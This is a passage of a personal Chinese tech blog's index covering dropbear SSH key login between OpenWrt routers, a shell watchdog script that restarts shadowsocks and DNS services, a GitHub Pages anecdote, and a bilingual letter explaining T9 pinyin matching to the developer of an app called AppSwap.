+<h1 id="先说结论：-dropbear-sshkey-登录"><a href="#先说结论：-dropbear-sshkey-登录" class="headerlink" title="先说结论： dropbear sshkey 登录"></a>先说结论： dropbear sshkey 登录</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">A 设备</span></span><br><span class="line">dropbearkey -t rsa -f /root/.ssh/id_dropbear</span><br><span class="line">dropbearkey -y -f /root/.ssh/id_dropbear | grep ssh-rsa &gt; /root/.ssh/id_dropbear.pub</span><br><span class="line">chmod 700 /root/.ssh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">B 设备</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">A 的公钥写入</span></span><br><span class="line">/etc/dropbear/authorized_keys</span><br><span class="line">chmod 600 /etc/dropbear/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh root@HOST_B</span><br></pre></td></tr></table></figure>
+
+<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>家里两台路由，都是 openwrt ，一台网关，一台Ap。网关上 64G 的 U盘快满了，想把 NAS 这些重任务从网关搬到 AP 上去，网关只承担 web 和 FQ 的任务。就买了个硬盘盒，装上闲置的 3.5&#x2F;HDD 挂载在 Ap 上。<br>但是这样文件就分离两处了。从外部访问的话就很麻烦，两个 Ftp 服务器~ 想着把 Ap 的硬盘远程挂载到 网关上去，这样从外部看就只有 1个 sFTP 服务器了。那么首先要搞定的就是 ssh 自动连接。<br>插一句，用 linux 原生的 NFS 挂载性能更好，但是我这里因为 openwrt 编译时没有包含 NFS 相关包，所以还是选择了 sFtp。</p>
+<p>不得不提的是。一般而言 sshkey 访问是以下步骤</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">A设备</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 ~.ssh 目录会生成  id_rsa 和 id_rsa.pub 两个文件，前者私钥后者公钥。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">B设备</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">公钥写入 B 设备 以下文件即可</span></span><br><span class="line">~.ssh/authorized_keys</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">当然还可以通过创建 ~.ssh/config 指定 key 的连接，默认 id_rsa</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如</span></span><br><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    IdentityFile ~/.ssh/github</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然而操作下来死活连接不通。查了下才知道 <code>openwrt</code> 用的是 <code>dropbear</code>, <code>authorized_keys</code> 位置在 <code>/etc/dropbear/</code> 下面~ 但是依然 ssh 不通。但是我用 PC 又可以连上去…… 网上查询也只有连 <code>dropbear</code> 的帖子，没有 <code>dropbear</code> 连 <code>dropbear</code> 的。中间的过程不想多说了…… 首先，<code>dropbear</code> ssh 默认使用的是 <code>.ssh/id_dropbear</code>；第二 <code>dropbear</code> 的使用的 sshkey 不和 openSSH 通用~ 需要使用 <code>dropbear</code> 单独生成一个文件，公钥再从这个文件提取。。。。。</p>
+<p>一上午就这么没了，哎 蛋疼。。。。</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>openwrt</category>
+      </categories>
+      <tags>
+        <tag>openwrt</tag>
+        <tag>lede</tag>
+        <tag>ssh</tag>
+        <tag>dropbear</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>外网监测脚本</title>
+    <url>/2016/05/31/study/openwrt/%E5%A4%96%E7%BD%91%E7%9B%91%E6%B5%8B%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<p>最近DNS老是解析错误，感觉 Chinadns 老挂啊。今天刚好休息，写个监控脚本解决下这个问题.</p>
+<p>好久没写 shell 脚本，被 JavaScript 的宽松语法惯坏了。一个 if then 结构都琢磨了一小时，最后发现 if 是接 [ ] 而不是 { } …… 真是郁闷</p>
+<span id="more"></span>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开机多拨延迟100s</span></span><br><span class="line"><span class="built_in">sleep</span> 100</span><br><span class="line">DATE=`<span class="built_in">date</span> +%Y-%m-%d-%H:%M:%S`</span><br><span class="line">tries=0</span><br><span class="line"></span><br><span class="line">SS=0</span><br><span class="line">DNS=0</span><br><span class="line"><span class="comment">#固定IP地址 要确定域名对应的IP不会变 这里我写的自己VPS域名对应的IP</span></span><br><span class="line">ip2=<span class="string">&quot;X.X.X.X&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> --- my_watchdog start ---</span><br><span class="line"><span class="keyword">while</span> [[ <span class="variable">$tries</span> -lt 5 ]]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment">#ss</span></span><br><span class="line">	wget -4 --spider --quiet --tries=1 --<span class="built_in">timeout</span>=3 www.google.co.jp</span><br><span class="line">	<span class="keyword">if</span> [ <span class="string">&quot;$?&quot;</span> == <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		SS=0</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		wget -4 --spider --quiet --tries=1 --<span class="built_in">timeout</span>=3 www.baidu.com</span><br><span class="line">		<span class="keyword">if</span> [ <span class="string">&quot;$?&quot;</span> == <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="variable">$DATE</span> Problem shadowsocks. SS <span class="variable">$tries</span> &gt;&gt; /root/log/ss1.<span class="built_in">log</span></span><br><span class="line">			SS=$((SS+<span class="number">1</span>))</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span>  <span class="variable">$DATE</span> Network Problem. Do nothing. SS <span class="variable">$tries</span> &gt;&gt; /root/log/ss1.<span class="built_in">log</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#dns</span></span><br><span class="line">	ip=$(nslookup chh-hk.noip.me 127.0.0.1 | <span class="built_in">tail</span> -1 | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$ip</span> == <span class="variable">$ip2</span> ]; <span class="keyword">then</span></span><br><span class="line">		DNS=0		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		DNS=$((DNS+<span class="number">1</span>))</span><br><span class="line">		<span class="built_in">echo</span> <span class="variable">$DATE</span> Problem DNS. DNS <span class="variable">$tries</span> &gt;&gt; /root/log/ss1.<span class="built_in">log</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#restart</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$SS</span> == <span class="string">&quot;0&quot;</span> -a <span class="variable">$DNS</span> == <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> --- <span class="built_in">exit</span> ---</span><br><span class="line">                <span class="built_in">exit</span> 0</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">   tries=$((tries+<span class="number">1</span>))</span><br><span class="line">   <span class="built_in">sleep</span> 2</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$DATE</span> restart &gt;&gt; /root/log/ss1.<span class="built_in">log</span></span><br><span class="line">/etc/init.d/shadowsocks restart</span><br><span class="line">/etc/init.d/dnsmasq restart</span><br><span class="line">/etc/init.d/chinadns restart</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>主要判断 SS 和 DNS 是否正常，如果正常则跳出，否则继续判断直到5次，5次不成功重启相关服务。<br>测试几天 以观后效。</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>openwrt</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
+        <tag>dns</tag>
+        <tag>chinadns</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GithubPages</title>
+    <url>/2019/01/08/study/other/GithubPages/</url>
+    <content><![CDATA[<p>刚刚巨硬宣布 Github 免费用户也可以拥有私密项目了。赶快去把博客改了~ 免得以后又不小心推了个人隐私上去……<br>嗯~ <code>Make this repository private</code> 确定。 我去！ Pages 服务自动被关闭了，私有项目不能使用 Pages。。。<br>好吧，改回来~ 结果 GitHub Pages 选项灰了。。。 一直显示构建中</p>
+<p>星星也没了~  &#x3D;.&#x3D;！ 蛋疼……</p>
+<p>删了重建算了~  T.T</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Re:AppSwap</title>
+    <url>/2016/06/02/study/other/Re-AppSwap/</url>
+    <content><![CDATA[<h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><p>Thank you for your letter，I regret the delay in answering your letter because I spent too much time in Demo.</p>
+<p>About your searching for advise in the E-mail, in order to help you better understanding the T9-Pinyin, I would like to take some time to explain.</p>
+<span id="more"></span>
+
+<h3 id="Pinyin"><a href="#Pinyin" class="headerlink" title="Pinyin"></a>Pinyin</h3><p>Pinyin is a form of Chinese letters expressed by the Latin alphabet。<br>Chinese words and Pinyin are one to one correspondence in a paragraph of text</p>
+<h4 id="one-to-one"><a href="#one-to-one" class="headerlink" title="one to one"></a>one to one</h4><p><strong>One</strong> Chinese word corresponds to <strong>One</strong> Pinyin In most cases.</p>
+<blockquote>
+<p><em>e.g.</em> &gt; ** Pinyin **<br>中 国 &lt;–&gt; Zhong Guo</p>
+<p>** T9 **<br>中 国 &lt;–&gt; Z G</p>
+<p><em>(The English translation: China)</em></p>
+</blockquote>
+<h4 id="one-to-more"><a href="#one-to-more" class="headerlink" title="one to more"></a>one to more</h4><p><strong>One</strong> Chinese word corresponds to <strong>multiple</strong> Pinyin In few cases.</p>
+<blockquote>
+<p><em>e.g.</em> &gt; ** Pinyin **<br>银 <strong>行</strong> &lt;–&gt; Yin <strong>Hang</strong> &gt; <strong>行</strong> 走 &lt;–&gt; <strong>Xing</strong> Zou</p>
+<p>** T9**<br>银 <strong>行</strong> &lt;–&gt; Y <strong>H</strong> &gt; <strong>行</strong> 走 &lt;–&gt; <strong>X</strong> Z</p>
+<p><em>(The English translation: Bank、Walk)</em></p>
+</blockquote>
+<h4 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h4><table>
+<thead>
+<tr>
+<th>English</th>
+<th align="center">Chinese</th>
+<th align="right">PinYin</th>
+<th align="right">T9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Alipay</td>
+<td align="center">支 付 宝</td>
+<td align="right">Zhi Fu Bao</td>
+<td align="right">Z F B</td>
+</tr>
+<tr>
+<td>Angry Bird</td>
+<td align="center">愤 怒 的 小 鸟</td>
+<td align="right">Feng Nu De Xiao Niao</td>
+<td align="right">F N D X N</td>
+</tr>
+<tr>
+<td>Love</td>
+<td align="center">爱 情</td>
+<td align="right">Ai Qing</td>
+<td align="right">A Q</td>
+</tr>
+<tr>
+<td>Virus</td>
+<td align="center">病 毒</td>
+<td align="right">Bing Du</td>
+<td align="right">B D</td>
+</tr>
+<tr>
+<td>Grass</td>
+<td align="center">小 草</td>
+<td align="right">Xiao Cao</td>
+<td align="right">X C</td>
+</tr>
+<tr>
+<td>Bank</td>
+<td align="center">银 行</td>
+<td align="right">Yin Hang</td>
+<td align="right">Y H</td>
+</tr>
+<tr>
+<td>Walk</td>
+<td align="center">行 走</td>
+<td align="right">Xing Zou</td>
+<td align="right">X Z</td>
+</tr>
+<tr>
+<td>Swan</td>
+<td align="center">天 鹅</td>
+<td align="right">Tian E</td>
+<td align="right">T E</td>
+</tr>
+<tr>
+<td>A Dog</td>
+<td align="center">一 只 狗</td>
+<td align="right">Yi Zhi Gou</td>
+<td align="right">Y Z G</td>
+</tr>
+<tr>
+<td>Bitchy</td>
+<td align="center">矫 情</td>
+<td align="right">Jiao Qing</td>
+<td align="right">J Q</td>
+</tr>
+</tbody></table>
+<p>translate into Json</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">var Pinyin = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;爱&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;宝&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;病&quot;</span><span class="punctuation">,</span><span class="string">&quot;草&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;的&quot;</span><span class="punctuation">,</span><span class="string">&quot;毒&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;鹅&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;f&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;付&quot;</span><span class="punctuation">,</span><span class="string">&quot;愤&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;g&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;狗&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;h&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;行&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;i&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;贱&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;j&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;矫&quot;</span><span class="punctuation">,</span><span class="string">&quot;就&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;k&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;l&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;怒&quot;</span><span class="punctuation">,</span><span class="string">&quot;鸟&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;o&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;q&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;情&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;r&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;人&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;s&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;是&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;天&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;u&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;v&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;w&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;小&quot;</span><span class="punctuation">,</span><span class="string">&quot;行&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;银&quot;</span><span class="punctuation">,</span><span class="string">&quot;一&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;支&quot;</span><span class="punctuation">,</span><span class="string">&quot;走&quot;</span><span class="punctuation">,</span><span class="string">&quot;只&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>important!</strong> &gt; [ <strong>行</strong> ] with T9[ <strong>h</strong> ] and T9[ <strong>x</strong> ]</p>
+</blockquote>
+<hr>
+<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>_<a href="/demo/demos/JS-T9输入法/" target="_blank" style="color:blue">T9 Demo</a> _</p>
+<h4 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h4><p>If you need it:</p>
+<ul>
+<li>_<a href="/demo/demos/JS-T9输入法/lib/T9_pinyin_tbl.js" target="_blank" style="color:blue">Pinyin and T9num</a> _</li>
+<li>_<a href="/demo/demos/JS-T9输入法/lib/T9_pinyin_short.js" target="_blank" style="color:blue">T9</a> _</li>
+</ul>
+<p>(maybe not all)</p>
+<hr>
+<h3 id="Suggest"><a href="#Suggest" class="headerlink" title="Suggest"></a>Suggest</h3><h4 id="More-simple"><a href="#More-simple" class="headerlink" title="More simple"></a>More simple</h4><h5 id="UI-Del①②③"><a href="#UI-Del①②③" class="headerlink" title="UI Del①②③"></a>UI Del①②③</h5><p><img src="/2016/06/02/study/other/Re-AppSwap/aw_s1_ui.jpg" alt="aw_s1_ui"></p>
+<p>Mini mode is considered to be more fast and simple. Will delete some not commonly used buttons of ①②③.</p>
+<p>① is not commonly used bug occupy the important position, The full Symbol of the application name is very few.</p>
+<p>I don’t think there will be a lot of application name like this</p>
+<blockquote>
+<p>×&amp;#@$</p>
+</blockquote>
+<hr>
+<p>If the application name like this</p>
+<blockquote>
+<p>App ! Name #^&amp;</p>
+</blockquote>
+<p>We can aatch by <em>App</em> or <em>Name</em> .</p>
+<hr>
+<p>If the application name like this</p>
+<blockquote>
+<p>A!p#p$N*a!m&amp;e</p>
+</blockquote>
+<p>I don’t think anyone like that name, and We can renamed by AppSwap. like this</p>
+<blockquote>
+<p>AppName</p>
+</blockquote>
+<hr>
+<p>Delete ① and ③ , Move ② to ① positon。Mini mode will become like this<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_s1_ui_min.jpg" alt="aw_s1_ui_min"></p>
+<p>In this case，the T9 number corresponding to the location of application. We can quickly start the application by long press or slide T9 numbers.</p>
+<hr>
+<p>I think you can use this app to find more simple ideas</p>
+<p><em><a href="https://play.google.com/store/apps/details?id=name.pilgr.appdialer" title="AppDialer">AppDialer</a></em></p>
+<p>and more fast algorithm<br><em><a href="https://github.com/pilgr/Paper">https://github.com/pilgr/Paper</a></em></p>
+<hr>
+<h4 id="logic"><a href="#logic" class="headerlink" title="logic"></a>logic</h4><p><img src="/2016/06/02/study/other/Re-AppSwap/aw_l1.jpg" alt="aw_l1"><br>In slide down, the keyboard should be the same as the start AppSwap in setting.</p>
+<hr>
+<p><img src="/2016/06/02/study/other/Re-AppSwap/aw_l2.jpg" alt="aw_l2"><br><strong>Hide</strong> in the yellow area when the green area is slide <strong>up</strong>.<br><strong>Show</strong> in the yellow area when the green area is slide <strong>Down</strong>.</p>
+<hr>
+<h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p><img src="/2016/06/02/study/other/Re-AppSwap/aw_o1.jpg" alt="aw_o1"><br>It’s a real hassle to apply the classification. If you can import through the Navo Launch will be a good way.</p>
+<hr>
+<h3 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h3><h4 id="INFO"><a href="#INFO" class="headerlink" title="INFO"></a>INFO</h4><ul>
+<li>App Swap 1.00.468</li>
+<li>Nexus 5</li>
+<li>Andriod 5.1.1</li>
+</ul>
+<h4 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h4><ol>
+<li><p>Pinyin filter can not use the delete key in T9.<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q0.gif" alt="aw_q0"></p>
+</li>
+<li><p>I don’t know how these two options come into effect, or have no effect?<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q1.jpg" alt="aw_q1"></p>
+</li>
+<li><p>Garbled of the pay page (Maybe the font is not totally in my ROM)<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q2.jpg" alt="aw_q2"></p>
+</li>
+<li><p>Pinyin unable to match from the middle in T9</p>
+</li>
+<li><p>Green areas slide up can not show more applications in Mini mode<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q3.jpg" alt="aw_q3"></p>
+</li>
+</ol>
+<h3 id="Last"><a href="#Last" class="headerlink" title="Last"></a>Last</h3><p>Thank you very much for your application to make Android more beautiful, if there is any problem please reply to my email, I will try to answer.</p>
+<h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><p>谢谢你的来信，因为在 Demo 上花费了一些时间，没有及时回信。<br>关于你在 Email 中寻求的建议，为了帮助你理解，我想先花费一些时间说说 T9-Pinyin。</p>
+<h3 id="Pinyin-1"><a href="#Pinyin-1" class="headerlink" title="Pinyin"></a>Pinyin</h3><p>Pinyin 是中文字母拉丁字母化的一种方式。一段文字中的中文和 Pinyin 的个数是一一对应的。</p>
+<h4 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h4><p>大多数情况下，一个中文字母对应一个拼音，例如</p>
+<blockquote>
+<p>** 全拼**<br>中 国 &lt;–&gt; Zhong Guo</p>
+<p>** T9**<br>中 国 &lt;–&gt; Z G</p>
+<p>(英文翻译是 China)</p>
+</blockquote>
+<h4 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h4><p>还有一些中文字母在不同情况下对应不同拼音，例如</p>
+<blockquote>
+<p>** 全拼**<br>银 <strong>行</strong> &lt;–&gt; Yin <strong>Hang</strong> &gt; <strong>行</strong> 走 &lt;–&gt; <strong>Xing</strong> Zou</p>
+<p>** T9**<br>银 <strong>行</strong> &lt;–&gt; Y <strong>H</strong> &gt; <strong>行</strong> 走 &lt;–&gt; <strong>X</strong> Z</p>
+<p>(英文翻译是 Bank、Walk)</p>
+</blockquote>
+<h4 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h4><table>
+<thead>
+<tr>
+<th>English</th>
+<th align="center">Chinese</th>
+<th align="right">PinYin</th>
+<th align="right">T9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Alipay</td>
+<td align="center">支 付 宝</td>
+<td align="right">Zhi Fu Bao</td>
+<td align="right">Z F B</td>
+</tr>
+<tr>
+<td>Angry Bird</td>
+<td align="center">愤 怒 的 小 鸟</td>
+<td align="right">Feng Nu De Xiao Niao</td>
+<td align="right">F N D X N</td>
+</tr>
+<tr>
+<td>Love</td>
+<td align="center">爱 情</td>
+<td align="right">Ai Qing</td>
+<td align="right">A Q</td>
+</tr>
+<tr>
+<td>Virus</td>
+<td align="center">病 毒</td>
+<td align="right">Bing Du</td>
+<td align="right">B D</td>
+</tr>
+<tr>
+<td>Grass</td>
+<td align="center">小 草</td>
+<td align="right">Xiao Cao</td>
+<td align="right">X C</td>
+</tr>
+<tr>
+<td>Bank</td>
+<td align="center">银 行</td>
+<td align="right">Yin Hang</td>
+<td align="right">Y H</td>
+</tr>
+<tr>
+<td>Walk</td>
+<td align="center">行 走</td>
+<td align="right">Xing Zou</td>
+<td align="right">X Z</td>
+</tr>
+<tr>
+<td>Swan</td>
+<td align="center">天 鹅</td>
+<td align="right">Tian E</td>
+<td align="right">T E</td>
+</tr>
+<tr>
+<td>A Dog</td>
+<td align="center">一 只 狗</td>
+<td align="right">Yi Zhi Gou</td>
+<td align="right">Y Z G</td>
+</tr>
+<tr>
+<td>Bitchy</td>
+<td align="center">矫 情</td>
+<td align="right">Jiao Qing</td>
+<td align="right">J Q</td>
+</tr>
+</tbody></table>
+<p>转化为 Json 格式为</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">var Pinyin = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;爱&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;宝&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;病&quot;</span><span class="punctuation">,</span><span class="string">&quot;草&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;的&quot;</span><span class="punctuation">,</span><span class="string">&quot;毒&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;鹅&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;f&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;付&quot;</span><span class="punctuation">,</span><span class="string">&quot;愤&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;g&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;狗&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;h&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;行&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;i&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;贱&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;j&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;矫&quot;</span><span class="punctuation">,</span><span class="string">&quot;就&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;k&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;l&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;怒&quot;</span><span class="punctuation">,</span><span class="string">&quot;鸟&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;o&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;q&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;情&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;r&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;人&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;s&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;是&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;天&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;u&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;v&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span 